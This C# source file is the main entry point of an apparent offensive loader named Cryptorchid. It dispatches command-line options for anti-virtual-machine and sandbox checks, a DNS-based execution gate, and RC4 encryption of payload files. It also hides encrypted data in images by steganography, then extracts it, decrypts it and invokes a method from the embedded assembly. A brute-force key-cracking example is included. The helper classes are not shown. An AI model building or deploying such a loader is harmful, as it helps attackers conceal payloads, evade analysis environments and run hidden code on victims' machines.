using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cryptorchid
{
    public class Program
    {

        public static void Main(string[] args)
        {
            bool noDNS = args.Contains("-NoDNS", StringComparer.OrdinalIgnoreCase);

            // If noDNS is not specified, perform DNS check
            if (!noDNS)
            {
                string inputIPAddress = args.FirstOrDefault(arg => !arg.StartsWith("-"));
                if (string.IsNullOrEmpty(inputIPAddress))
                {
                    Console.WriteLine("Usage: Cryptorchid.exe <IPAddress> | -NoDNS");
                    return;
                }
                DNSCheck.CheckDNSAndContinue(inputIPAddress);
            }

            if (args.Contains("-antivm", StringComparer.OrdinalIgnoreCase))
            {
                // Check for virtualization
                if (AntiVirtualization.Execute())
                {
                    Console.WriteLine("Virtual machine detected. Exiting...");
                    Environment.Exit(1);
                }
                else
                {
                    Console.WriteLine("No sandbox or debuggers found.");
                }
            }
            else if (args.Contains("-testload", StringComparer.OrdinalIgnoreCase))
            {
                string hardcodedMethodSignature = "Calc.Modes.RunCalc.Execute";

                try
                {
                    Load.TestLoad(hardcodedMethodSignature);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error invoking method from precompiled DLL: {ex.Message}");
                }
                return; // Exit after loading and invoking
            }


            if (args.Contains("-steg", StringComparer.OrdinalIgnoreCase))
            {
                string key = args.SkipWhile(arg => !arg.Equals("-steg", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
                string inputFilePath = args.SkipWhile(arg => !arg.Equals("-steg", StringComparison.OrdinalIgnoreCase)).Skip(2).FirstOrDefault();
                string imageFilePath = args.SkipWhile(arg => !arg.Equals("-steg", StringComparison.OrdinalIgnoreCase)).Skip(3).FirstOrDefault();

                if (!string.IsNullOrEmpty(key) && !string.IsNullOrEmpty(inputFilePath) && !string.IsNullOrEmpty(imageFilePath))
                {
                    try
                    {
                        Steg.EncryptAndHideInImage(inputFilePath, imageFilePath, key);
                        string newImageFilePath = Path.Combine(Path.GetDirectoryName(imageFilePath), Path.GetFileNameWithoutExtension(imageFilePath) + "_copy" + Path.GetExtension(imageFilePath));
                        Console.WriteLine($"Hash added to image {newImageFilePath}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error adding hash: {ex.Message}");
                    }
                }
                else
                {
                    Console.WriteLine("Please provide a valid key, input file path, and image file path.");
                    Console.WriteLine("Example: -steg <encryptionKey> <inputFilePath> <imageFilePath>");
                }
                return; // Exit after adding hash
            }

            else if (args.Contains("-stegload", StringComparer.OrdinalIgnoreCase))
            {
                string imageFilePath = args.SkipWhile(arg => !arg.Equals("-stegload", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
                string methodSignature = args.SkipWhile(arg => !arg.Equals("-stegload", StringComparison.OrdinalIgnoreCase)).Skip(2).FirstOrDefault();

                if (string.IsNullOrEmpty(methodSignature))
                {
                    Console.WriteLine("Error: Method signature must be provided e.x. Calc.Modes.RunCalc.Execute");
                    return;
                }

                try
                {
                    Steg.ExStegDecryptAndLoad(imageFilePath, methodSignature);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error extracting hash, decrypting data, or invoking method: {ex.Message}");
                }
                return;
            }

            if (args.Contains("-desteg", StringComparer.OrdinalIgnoreCase))
            {
                string imageFilePath = args.SkipWhile(arg => !arg.Equals("-desteg", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();

                try
                {
                    Steg.ExStegDecrypt(imageFilePath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error extracting hash or decrypting data: {ex.Message}");
                }
                return; // Exit after decryption
            }

            if (args.Contains("-encrypt", StringComparer.OrdinalIgnoreCase))
            {
                string inputFilePath = args.SkipWhile(arg => !arg.Equals("-encrypt", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
                string key = args.SkipWhile(arg => !arg.Equals("-encrypt", StringComparison.OrdinalIgnoreCase)).Skip(2).FirstOrDefault();

                if (string.IsNullOrEmpty(inputFilePath) || string.IsNullOrEmpty(key))
                {
                    Console.WriteLine("Usage: Cryptorchid.exe -encrypt <inputFilePath> <key>");
                    return;
                }

                // Set the input file to be read inside ExEncrypt
                Encrypt.ExEncrypt(inputFilePath, key);
                return; // Exit after encryption
            }

            // Handle  decrypt
            if (args.Contains("-decrypt", StringComparer.OrdinalIgnoreCase))
            {
                string outputPath = args.SkipWhile(arg => !arg.Equals("-decrypt", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
                Encrypt.ExDecrypt(string.IsNullOrEmpty(outputPath) ? null : outputPath);
                return; // Exit after decryption
            }

            if (args.Contains("-gethash", StringComparer.OrdinalIgnoreCase))
            {
                string inputFilePath = args.SkipWhile(arg => !arg.Equals("-gethash", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
                if (!string.IsNullOrEmpty(inputFilePath))
                {
                    try
                    {
                        uint hash = Steg.ExtractHashFromImage(inputFilePath);
                        Console.WriteLine($"Hash from metadata: {hash}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error extracting hash: {ex.Message}");
                    }
                }
                else
                {
                    Console.WriteLine("Please provide a valid file path.");
                }
                return; // Exit after extracting hash
            }

            // Handle -example argument
            if (args.Contains("-example", StringComparer.OrdinalIgnoreCase))
            {
                string key = "aMsI";
                string plaintext = "Teeth Of Lions Rule the Divine";
                byte[] keyBytes = Encoding.ASCII.GetBytes(key);
                byte[] inputBytes = Encoding.ASCII.GetBytes(plaintext);
                byte[] outputBytes = new byte[inputBytes.Length];

                Encrypt.RC4EncryptDecrypt(keyBytes, inputBytes, outputBytes);
                Console.WriteLine("Encrypted: " + BitConverter.ToString(outputBytes));

                byte[] decryptedBytes = new byte[inputBytes.Length];
                Encrypt.RC4EncryptDecrypt(keyBytes, outputBytes, decryptedBytes);
                Console.WriteLine("Decrypted: " + Encoding.ASCII.GetString(decryptedBytes));

                // Brute force key cracking (with an example hardcoded hash)
                uint hardcodedHash = Encrypt.DJB2Hash(inputBytes);
                string crackedKey = Encrypt.CrackKey(outputBytes, hardcodedHash);
                Console.WriteLine("Cracked Key: " + crackedKey);

                return; // Exit after example
            }
        }
    }
}
